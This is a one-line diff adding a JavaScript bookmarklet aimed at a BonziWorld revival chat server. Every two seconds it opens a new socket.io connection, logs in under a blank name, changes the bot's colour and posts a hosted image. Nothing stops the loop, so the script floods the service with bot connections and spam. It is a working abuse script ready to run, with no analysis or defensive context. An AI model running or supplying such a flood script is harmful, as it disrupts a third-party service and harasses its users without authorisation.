@@ -1,0 +1,1 @@
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://bonziworld-revived-1.onrender.com/"); sockets.push(G);G.emit('login',{name:' '}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["img","https://files.catbox.moe/ovmqeo.png"]})} ,2000);
